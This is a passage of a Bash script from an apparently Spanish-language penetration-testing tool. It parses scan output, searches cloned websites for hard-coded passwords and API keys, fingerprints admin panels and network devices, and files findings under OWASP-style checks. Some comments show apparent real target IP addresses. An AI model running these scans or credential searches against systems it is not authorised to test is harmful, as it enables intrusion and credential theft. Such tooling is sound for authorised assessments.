			grep -ir "password' =>" * . 2>/dev/null| egrep -vi "NULL|false|md5" > ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog1.txt # 'password' => '12344321'
			trufflehog filesystem --config=/usr/share/lanscanner/generic-password.yml --exclude-detectors=polygon . > ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt

			cat ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog1.txt >>../../.vulnerabilidades/"$DOMINIO"_web_apiKey.txt
			cat ../../logs/vulnerabilidades/"$DOMINIO"_web_trufflehog2.txt >>../../.vulnerabilidades/"$DOMINIO"_web_apiKey.txt

		cd ../../
		#grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt
		#grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt
		###################
	fi

	####Parse 2
	grep SUCCEED logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webdav.txt >> .vulnerabilidades/"$host"_"$port"_webdav.txt 2>/dev/null
	grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IIS-CVE~2017~7269.txt  2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_IIS-CVE~2017~7269.txt
	######

	##### Identificar paneles administrativos #####
	echo " ##### Identificar paneles administrativos ##### "
	touch .enumeracion/canary_webData.txt # para que grep no falle cuando solo hay un archivo

	###########3paneles de admin de desarollo propio (custom) + CMS
	egrep -ira "$customPanel" logs/enumeracion/*_webDataInfo.txt 2>/dev/null| egrep -vi "$defaultAdminURL" | cut -d '~' -f5 | delete-duplicate-urls.py | sort | uniq -i > servicios/web-admin-temp.txt
	if [ ! -f "servicios_archived/admin-web-custom-inserted.txt" ]; then
		touch "servicios_archived/admin-web-custom-inserted.txt"
	fi
	sort servicios_archived/admin-web-custom-inserted.txt > servicios_archived/admin-web-custom-inserted-sorted.txt
	comm -23 servicios/web-admin-temp.txt servicios_archived/admin-web-custom-inserted-sorted.txt  >> servicios/admin-web-url.txt #eliminar elementos repetidos
	###########################

	########### paneles admin genericos sophos,cisco, etc
	egrep -ira "$defaultAdminURL" logs/enumeracion/*_webDataInfo.txt |grep -iv 'error' | awk -F'~' '{split($1, a, ":"); print $5 ";" a[2]}' | sort | uniq >  servicios/web-admin-default-temp.txt
	if [ ! -f "servicios_archived/admin-web-generic-inserted.txt" ]; then
		touch "servicios_archived/admin-web-generic-inserted.txt"
	fi
	sort servicios_archived/admin-web-generic-inserted.txt > servicios_archived/admin-web-generic-inserted-sorted.txt
	comm -23 servicios/web-admin-default-temp.txt servicios_archived/admin-web-generic-inserted-sorted.txt  >> servicios/admin-web-generic.txt #eliminar elementos repetidos
	#rm servicios/web-admin-default-temp.txt
	######################################

fi #sitio escaneado




######### find services ###
cd .enumeracion/
	touch canary.txt # es necesario que exista al menos 2 archivos
	echo '' > canary_cert.txt

	grep --color=never -i "Dahua" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'   >> ../servicios/dahua-web.txt
	grep --color=never -i "Dell iDRAC" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/idrac.txt
	grep --color=never -i "WebLogic Server" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/WebLogic.txt
	grep --color=never -i "Grafana" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/Grafana.txt
	grep --color=never -i "Fortinet" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/fortinet.txt
	grep --color=never -i "hikvision" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/hikvision.txt
	grep --color=never -i "optical network terminal" *webData.txt 2>/dev/null| cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/HUAWEI-AR.txt

	grep --color=never -i "ONT-4G" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ONT1GE3FE2P1TVSWZ" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2017' | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-F6XX-2017.txt
	grep --color=never -i "ZTE corp " *webData.txt 2>/dev/null | grep 'F6' | grep 'ZTE-2018' | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  > ../servicios/ZTE-F6XX-2018.txt

	grep --color=never -i ciscoASA *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ciscoASA.txt
	grep --color=never -i "Cisco Router" *webData.txt 2>/dev/null | cut -d '_' -f1-2 | tr '_' ':' | tr -d '-'  >> ../servicios/ciscoRouter.txt

	#ZKsoftware
	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/ZKSoftware.txt


	#phpmyadmin, etc
	#responde con 401
	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|webData|Usando archivo" | grep 401 | awk '{print $3}' | sort | uniq -i | uniq | tr -d '-'  >> ../servicios/web401.txt

	#responde con 200 OK
	cat *_webadmin.txt 2>/dev/null | grep 200 | awk '{print $3}' | sort | uniq -i  >> ../servicios/admin-web-url.txt

	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|ajp13Info" | awk '{print $3}' | sort | uniq -i | uniq | delete-duplicate-urls.py >> ../servicios/admin-web-generic.txt
	#

	#Fortigate
	grep --color=never -i "fortigate" *_cert.txt 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google" | cut -d "_" -f1-2 | tr '_' ':' | tr -d '-' | uniq >> ../servicios/fortigate.txt

	#3com
	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | tr -d '-'| uniq >> ../servicios/3com2.txt
	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
	rm ../servicios/3com2.txt

	#d-link
	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | tr -d '-' | uniq >> ../servicios/d-link2.txt
	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
	rm ../servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | tr -d '-' | uniq >> ../servicios/linksys2.txt
	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
	rm ../servicios/linksys2.txt

	#Pentahoo
	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'> ../servicios/pentaho.txt

	#Dahua Camera
	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'> ../servicios/dahua_camara.txt

	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/ubiquiti2.txt
	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt

	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/pfsense.txt

	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/PRTG.txt

	#HIKVISION
	grep --color=never -i 'doc/page/login.asp' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/hikvision.txt

	#vCenter
	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/vCenter.txt

	#Cisco
	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" |  cut -d "_" -f1 | tr -d '-'| uniq >> ../servicios/cisco.txt

	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-' | uniq >> ../servicios/zimbra.txt

	#jboss
	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/jboss.txt

	#F5
	grep --color=never -i 'F5 Networks' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | tr -d '-'| uniq >> ../servicios/f5.txt

	#401
		#line = http://200.87.193.109:80/phpmyadmin/
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../servicios/web401-2.txt
		#line=10.0.0.2:443
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
	# sort
	sort ../servicios/web401-2.txt 2>/dev/null | uniq | uniq  | tr -d '-' >> ../servicios/web401.txt
	rm ../servicios/web401-2.txt 2>/dev/null

cd ..
################################


# revisar si hay scripts ejecutandose
waitFinish
insert_data

if [[ $webScaneado -eq 1 ]]; then
	
	############ vulnerabilidades relacionados a servidores/aplicaciones web ########
	echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"
	#Vulnerabilidades detectada en la raiz del servidor
	echo "canary" > .enumeracion2/canary_webData.txt
	#egrep "vulnerabilidad=" .enumeracion2/* 2>/dev/null| while read -r line ; do
	find .enumeracion2 .vulnerabilidades2 -type f 2>/dev/null | xargs egrep "vulnerabilidad=" 2>/dev/null | while read -r line ; do 

		echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"
		#line=".enumeracion2/170.239.123.50_80_webData.txt:Control de Usuarios ~ Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8~200 OK~~http://170.239.123.50/login/~|301 Moved~ PHP/5.6.8~vulnerabilidad=MensajeError~^"
		archivo_origen=`echo $line | cut -d ':' -f1` #.enumeracion2/170.239.123.50_80_webData.txt
		if [[ ${archivo_origen} == *"webdirectorios.txt"* || ${archivo_origen} == *"custom.txt"* || ${archivo_origen} == *"webadmin.txt"* || ${archivo_origen} == *"divulgacionInformacion.txt"* || ${archivo_origen} == *"archivosPeligrosos.txt"* || ${archivo_origen} == *"webarchivos.txt"* || ${archivo_origen} == *"webserver.txt"* || ${archivo_origen} == *"archivosDefecto.txt"* || ${archivo_origen} == *"api.txt"* || ${archivo_origen} == *"backupweb.txt"* || ${archivo_origen} == *"webshell.txt"*  || ${archivo_origen} == *"phpinfo.txt"*  || ${archivo_origen} == *"SharePoint.txt"* || ${archivo_origen} == *"archivosCGI.txt"* ]]; then
			url_vulnerabilidad=`echo "$line" | grep -o 'http[s]\?://[^ ]*'` # extraer url
		else
			# Vulnerabilidad detectada en la raiz
			url_vulnerabilidad=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":" | tr -d '-'`  #192.168.0.36:8080
			if [[ ${url_vulnerabilidad} == *"443"* || ${url_vulnerabilidad} == *"9091"*  || ${url_vulnerabilidad} == *"8443"* ]]; then
				url_vulnerabilidad="https://$url_vulnerabilidad" #http://192.168.0.36:8080
			else
				url_vulnerabilidad="http://$url_vulnerabilidad"
			fi
		fi


		vulnerabilidad=`echo "$line" | grep -o 'vulnerabilidad=[^ )~]*' | sed 's/vulnerabilidad=//'` #OpenPhpMyAdmin,MensajeError,etc
		echo "vulnerabilidad $vulnerabilidad url_vulnerabilidad $url_vulnerabilidad"
		archivo_destino=$archivo_origen
		archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}
		archivo_destino=${archivo_destino/.vulnerabilidades2/.vulnerabilidades}

		archivo_destino=${archivo_destino/webdirectorios/$vulnerabilidad}
		archivo_destino=${archivo_destino/webarchivos/$vulnerabilidad}
		archivo_destino=${archivo_destino/webadmin/$vulnerabilidad}
		archivo_destino=${archivo_destino/webData/$vulnerabilidad}
		archivo_destino=${archivo_destino/custom/$vulnerabilidad}
		archivo_destino=${archivo_destino/archivosCGI/$vulnerabilidad}


		if [ $vulnerabilidad == 'backdoor' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] backdoor en $url_vulnerabilidad"  ; fi
			contenido=$url_vulnerabilidad
		fi

		if [ $vulnerabilidad == 'FPD' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] FPD en $url_vulnerabilidad"  ; fi
			contenido=$url_vulnerabilidad
		fi

		if [ $vulnerabilidad == 'PasswordDetected' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] PasswordDetected en $url_vulnerabilidad"  ; fi
			contenido="URL $url_vulnerabilidad\n\n"
			contenido+=`getExtract -url $url_vulnerabilidad -type password | uniq`
		fi

		if [ $vulnerabilidad == 'ListadoDirectorios' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] ListadoDirectorios en $url_vulnerabilidad"  ; fi
			contenido=`listDir -url=$url_vulnerabilidad `
			if [[ -n "$contenido" ]] && [[ "$contenido" != "[DIR]| Parent Directory | | -" ]]; then # si no esta vacio
				contenido="\nURL $url_vulnerabilidad\n\n$contenido \n\n"
			fi
		fi

		if [ $vulnerabilidad == 'contenidoPrueba' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] contenidoPrueba"  ; fi
			contenido="$url_vulnerabilidad"
		fi

		if [ $vulnerabilidad == 'redirectContent' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] redirectContent"  ; fi
			contenido="$url_vulnerabilidad"
		fi


		if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then
			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"
			contenido="$url_vulnerabilidad"
		fi

		if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' || $vulnerabilidad == 'divulgacionInformacion' ]];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
			contenido="$url_vulnerabilidad"
		fi


		if [ $vulnerabilidad == 'MensajeError' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] MensajeError \n"  ; fi
			contenido="$url_vulnerabilidad" 
			#`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
		fi

		if [ $vulnerabilidad == 'IPinterna' ];then
			if [ "$VERBOSE" == '1' ]; then  echo -e "[+] IPinterna \n"  ; fi
			contenido="URL $url_vulnerabilidad\n\n"
			contenido+=`getExtract -url $url_vulnerabilidad -type IPinterna | uniq`
		fi


		if [[ $vulnerabilidad == 'phpinfo' ]];then
			if [ "$VERBOSE" == '1' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
			echo "archivo_origen $archivo_origen"
			#.vulnerabilidades2/170.239.123.50_80_webData.txt
			# archivo_origen .vulnerabilidades2/200.87.130.42_443-_phpinfo.txt
			archivo_phpinfo=`echo "$archivo_origen" | sed 's/.enumeracion2\///'|sed 's/.vulnerabilidades2\///'`
			#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
			#echo "archivo_phpinfo: logs/vulnerabilidades/$archivo_phpinfo"
			get-info-php "$url_vulnerabilidad" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null
			egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				#echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
				contenido="\n\n"
				# Añadir URL a la variable contenido
				contenido+="URL $url_vulnerabilidad\n\n"
				# Añadir el resultado del grep a la variable contenido
				contenido+=$(grep ':' logs/vulnerabilidades/$archivo_phpinfo)
				contenido+="\n\n"
			else
				echo -e "[i] No es un archivo phpinfo valido"
			fi	#archivo phpinfo
		fi

		echo "archivo_destino $archivo_destino"
		echo -e $contenido >> $archivo_destino
	done
	# insertar datos
	insert_data
	#################################
fi #webScanned

# banner grabbing de los paneles administrativos "custom"
if [[ -f servicios/admin-web-url.txt ]] ; then # 
	#https://sucre.bo/mysql/
	echo -e "$OKBLUE [i] Identificando paneles de administracion $RESET"
	while IFS= read -r url
	do
		
		if ! grep -qF "$url" servicios/admin-web-custom-inserted.txt 2>/dev/null && ! grep -qF "$url" servicios_archived/admin-web-custom-inserted.txt 2>/dev/null; then
			echo -e "\n\t########### ($url)  #######"
			####### Identificar tipo de panel de admin
			host_port=`echo $url | cut -d "/" -f 3` # 190.129.69.107:80
			proto_http=`echo $url | cut -d ":" -f 1`
			if [[ ${host_port} == *":"* ]]; then
				port=`echo $host_port | cut -d ":" -f 2`
			else
				if [[  ${proto_http} == *"https"* ]]; then
					port="443"
				else
					port="80"
				fi
			fi
			host=`echo $host_port | cut -d ":" -f 1`
			path_web2=`echo $url | cut -d "/" -f 4-5`
			path_web2_sin_slash=$(echo "$path_web2" | sed 's/\///g')

			echo -e "\t[+] Identificando "
			#web_fingerprint=`webData.pl -t $host -d "/$path_web2" -p $port -s $proto_http -e todo -l /dev/null -r 4 2>/dev/null | sed 's/\n//g'`
			webData -proto $proto_http -target $host -port $port -path "/$path_web2" -logFile /dev/null -maxRedirect 2 2>/dev/null | sed 's/\n//g' > logs/enumeracion/"$host"_"$port-$path_web2_sin_slash"_webFingerprint.txt &		
		fi

	done < servicios/admin-web-url.txt
fi

waitFinish

#parse
if [[ -f servicios/admin-web-url.txt ]] ; then # si existe paneles administrativos y no se esta escaneado un sitio en especifico
	echo -e "$OKBLUE [i] PARSE: paneles de administracion $RESET"
	while IFS= read -r url
	do
		
		if ! grep -qF "$url" servicios/admin-web-custom-inserted.txt 2>/dev/null && ! grep -qF "$url" servicios_archived/admin-web-custom-inserted.txt 2>/dev/null; then
			echo -e "\n\t########### ($url)  #######"
			####### Identificar tipo de panel de admin
			host_port=`echo $url | cut -d "/" -f 3` # 190.129.69.107:80
			proto_http=`echo $url | cut -d ":" -f 1`
			if [[ ${host_port} == *":"* ]]; then
				port=`echo $host_port | cut -d ":" -f 2`
			else
				if [[  ${proto_http} == *"https"* ]]; then
					port="443"
				else
					port="80"
				fi
			fi
			host=`echo $host_port | cut -d ":" -f 1`
			path_web2=`echo $url | cut -d "/" -f 4-5`
			path_web2_sin_slash=$(echo "$path_web2" | sed 's/\///g')

			echo -e "\t[+] Parse "
			web_fingerprint=`cat  logs/enumeracion/"$host"_"$port-$path_web2_sin_slash"_webFingerprint.txt | tr '[:upper:]' '[:lower:]' | tr -d ";"` # a minusculas y eliminar  ;
			#############
			if [[ ${web_fingerprint} == *"404 not found"* ]]; then
				echo -e "\t[+] Falso positivo (404) "
			else
				echo "$url;$web_fingerprint" >> servicios/admin-web-asorted.txt
			fi #404
		fi

	done < servicios/admin-web-url.txt
fi

sort servicios/admin-web-asorted.txt 2>/dev/null | uniq > servicios/admin-web-custom.txt
rm servicios/admin-web-asorted.txt rm servicios/admin-web-url.txt 2>/dev/null

if [[ "$ESPECIFIC" == "1" ]];then
	### OWASP Verification Standard Part 2###

	#CS-01 Variable en GET
	egrep 'token|session' logs/enumeracion/"$host"_parametrosGET_uniq_final.txt >> .vulnerabilidades/"$host"_"$port"_CS-01.txt 2>/dev/null

	#CS-39	API REST y api
	grep -i 'api' .vulnerabilidades2/"$host"_"$port"_archivosPeligrosos.txt >> .vulnerabilidades/"$host"_"$port"_CS-39.txt 2>/dev/null

	#CS-40 Divulgación de información
	grep -ira 'vulnerabilidad=divulgacionInformacion' logs | egrep -v '404|403'| cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	grep -ira 'vulnerabilidad=debugHabilitado' logs |  egrep -v '404|403'| cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	grep -ira 'vulnerabilidad=MensajeError' logs |  egrep -v '404|403'| cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	grep -ira 'vulnerabilidad=IPinterna' logs | egrep -v '404|403'| cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	grep -ira 'vulnerabilidad=phpinfo' logs |  egrep -v '404|403' | cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	grep -ira 'vulnerabilidad=backdoor' logs |  egrep -v '404|403' | cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-40.txt

	for file in $(ls .enumeracion2 .vulnerabilidades2 | grep wpVersion ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Wordpress version:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_perdidaAutenticacion|_webarchivos|_SharePoint|_webdirectorios|_archivosSAP|_webservices|_archivosTomcat|_webserver|_archivosCGI|_CGIServlet|_sapNetweaverLeak|_custom' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | grep -v 'ListadoDirectorios' >> .vulnerabilidades/"$host"_"$port"_CS-40.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-40.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-40.txt 2>/dev/null


	#CS-41 Exposición de usuarios
	grep -ira 'vulnerabilidad=ExposicionUsuarios' logs | cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-41.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | grep _wpUsers ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Usuarios:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-41.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-41.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-41.txt 2>/dev/null


	#CS-44 Servidores
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosPeligrosos|_backupweb' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  >> .vulnerabilidades/"$host"_"$port"_CS-44.txt
	cat .vulnerabilidades/"$host"_"$port"_CS-44.txt >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-44.txt 2>/dev/null

	# CS-51-2 headers
	cat .vulnerabilidades2/"$host"_"$port"_vulTLS.txt 2>/dev/null | grep -v 'HSTS' >> .vulnerabilidades/"$host"_"$port"_CS-51-2.txt 2>/dev/null
	cat .vulnerabilidades2/"$host"_"$port"_confTLS.txt >> .vulnerabilidades/"$host"_"$port"_CS-51-2.txt 2>/dev/null


	#CS-46 Archivos por defecto
	grep -ira 'vulnerabilidad=contenidoPrueba' logs | cut -d '~' -f5 >> .vulnerabilidades/"$host"_"$port"_CS-46.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosDefecto|_passwordDefecto' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  >> .vulnerabilidades/"$host"_"$port"_CS-46.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-46.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-46.txt 2>/dev/null

	#CS-48 Servidor mal configurado
	grep -ira 'vulnerabilidad=ListadoDirectorios' logs | cut -d '~' -f5 | uniq >> .vulnerabilidades/"$host"_"$port"_CS-48.txt
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_heartbleed|_tomcatNuclei|_apacheNuclei|_IIS-CVE~2017~7269|_citrixVul|_apacheStruts|_shortname|_apacheTraversal' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad server:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-48.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-48.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-48.txt 2>/dev/null

	#CS-63 Software obsoleto
	egrep -ira "\.class\"|\.class\'|\.class |\.nmf\"|\.nmf\'|\.nmf |\.xap\"|\.xap\'|\.xap |\.swf\"|\.swf\'|\.swf |x-nacl|<object |application\/x-silverlight" webClone/"$host"/ >> .vulnerabilidades/"$host"_"$port"_CS-63.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-63.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-63.txt 2>/dev/null

	#CS-56 Funciones peligrosas
	egrep -ira " eval\(" webClone/"$host"/ >> .vulnerabilidades/"$host"_"$port"_CS-56.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-56.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-56.txt 2>/dev/null

	# CS-69 Vulnerabilidades conocidas
	for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_droopescan|_joomlaNuclei|_wordpressNuclei|_drupalNuclei|_redirectContent|_xmlRpcHabilitado|_wordpressPlugins|_wordpress~CVE~2022~21661|_wordpressGhost|_proxynoshell|_proxyshell|_registroHabilitado|_sap-scan' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad app:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-69.txt
	cp .vulnerabilidades/"$host"_"$port"_CS-69.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-69.txt 2>/dev/null

	if [[ "$MODE" == "total" ]]; then
		# CS-62 HTTP header injection
		echo -e "\t[+]HTTP header injection"
		headi -u $URL > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-62.txt
		grep 'Vul' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-62.txt >> .vulnerabilidades/"$host"_"$port"_CS-62.txt
	fi
fi

insert_data
# delete empty files
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
#Insertar paneles administrativos servicios/web-admin-fingerprint.txt
insert_data_admin 2>/dev/null